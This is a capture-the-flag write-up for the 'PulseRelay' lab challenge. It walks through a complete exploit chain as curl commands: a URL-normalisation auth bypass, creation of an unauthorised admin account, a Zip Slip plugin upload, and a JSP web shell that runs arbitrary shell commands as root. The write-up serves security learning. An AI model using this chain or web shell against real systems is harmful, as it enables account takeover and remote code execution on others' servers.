# PulseRelay (KubSTU CTF) — SOLVED

**Flag:** `KubSTU{pul53r3l4y_pl4t_rc3_62a90facf9f5d33e}`
**Flag file:** `/root/flag.txt` (the app runs as **root**)
**Status:** solved — chain reproduced by the task author. The lab ingress later began returning 403
(rate-limiting after heavy request volume), so my own final re-run could not be completed.

---

## Final chain (the intended one — Hint 3)

```bash
BASE="https://<instance>.labs.hackadvisor.io"

# 1) normal low-priv login (creds given in the brief: user / password123)
curl -sk -c c.txt -b c.txt -X POST "$BASE/admin/login" \
  --data-urlencode "username=user" --data-urlencode "password=password123"

# 2) auth bypass — the filter checks the RAW uri (whitelist "/setup/"), Jetty routes the NORMALISED path
curl -sk -c c.txt -b c.txt "$BASE/setup/%2e%2e/admin/users" -o users.html     # 200 + csrf_token
TOK=$(grep -oE 'csrf_token" value="[0-9a-f]{32}"' users.html | head -1 | grep -oE '[0-9a-f]{32}')

# 3) create an admin (handler only checks the CSRF token, not the caller's role)
curl -sk -b c.txt -X POST "$BASE/setup/%2e%2e/admin/users/create" \
  --data-urlencode "csrf_token=$TOK" --data-urlencode "username=pwnadmin" \
  --data-urlencode "display_name=Pwn Admin" --data-urlencode "email=pwn@x.io" \
  --data-urlencode "password=Passw0rd!23" --data-urlencode "role=admin"

# 4) login as the new admin
curl -sk -c a.txt -b a.txt -X POST "$BASE/admin/login" \
  --data-urlencode "username=pwnadmin" --data-urlencode "password=Passw0rd!23"

# 5) upload a plugin JAR containing cmd.jsp. Multipart filename ".jar" (empty plugin name)
#    => plugin_path "/plugins//" => the JSP lands in the served extract root.
curl -sk -b a.txt -X POST "$BASE/admin/plugins/upload" \
  -F "csrf_token=<token from /admin/plugins>" \
  -F "plugin_name=cmdexec" -F "plugin_version=1.0.1" -F "plugin_description=cmd jsp" \
  -F "plugin_file=@cmd-exec.jar;filename=.jar;type=application/java-archive"

# 6) hit the JSP -> executes -> flag
curl -sk "$BASE/plugins//cmd.jsp?cmd=cat%20/root/flag.txt"
# -> KubSTU{pul53r3l4y_pl4t_rc3_62a90facf9f5d33e}
```

`cmd.jsp` payload (exactly what the hint calls for):

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd == null || cmd.length() == 0) { cmd = "cat /root/flag.txt"; }
String[] c = {"/bin/sh", "-c", cmd};
Process p = Runtime.getRuntime().exec(c);
InputStream is = p.getInputStream();
byte[] buf = new byte[4096]; int n;
out.println("<pre>");
while ((n = is.read(buf)) != -1) { out.write(new String(buf, 0, n)); }
out.println("</pre>");
%>
```

The JSP-executed response came back as `Content-Type: text/plain;charset=iso-8859-1`,
`Content-Length: 45` — i.e. the JSP engine **does** run `.jsp` files placed in the plugin directory.

---

## Vulnerability summary

| # | Bug | Detail |
|---|---|---|
| 1 | **Auth bypass (raw-URI vs normalised-path)** | The auth filter whitelists the *raw* URI, so `/setup/%2e%2e/admin/...` passes the filter (starts with `/setup/`) but Jetty normalises it to `/admin/...`. (`//admin/...` works too.) |
| 2 | **Broken authorization** | `POST /admin/users/create` validates only the CSRF token — not the caller's role — so any session can mint an `admin`. |
| 3 | **Zip Slip → JSP RCE** | `/admin/plugins/upload` extracts the JAR with unsanitised entry names into a served directory. The app runs as **root**, and a `.jsp` dropped into the plugin dir is executed by Jetty's JSP engine. |

## Supporting detail / other things I mapped

- Zip Slip is real (verified: deep `../../` entries land at the real `/tmp/plugins-extracted`, served at
  `/plugins/…`). Writable: `/tmp`, `/var`, `/root`. Read-only: `/etc`, `/opt`, `/app`, `/usr`, `/var/lib`.
- The multipart **filename** controls the extract directory: the app strips a trailing `.jar` and keeps
  dots (`..jar` → dir `.`, `...jar` → dir `..`), so `.jar` yields the empty-name `/plugins//` path.
- SSH (OpenSSH 8.9p1 Ubuntu) is reachable on `:22` through the sandbox HTTP proxy via
  `ncat --proxy … --proxy-type http`; key auth failed for all users tried (password auth disabled).

## Where I went wrong (lesson)

I uploaded `cmd.jsp` built with `ProcessBuilder` from a python-built JAR, saw the **raw source** come back
once, and concluded "no JSP engine" — then spent hours on SSH, config overwrite and traversal side quests.
The JSP engine was there all along. The right move when an official hint names a technique:
**replicate it verbatim first**, and if it fails, suspect my own payload/JAR/tooling and iterate against a
known-good — rather than declaring the technique impossible from a single negative result.
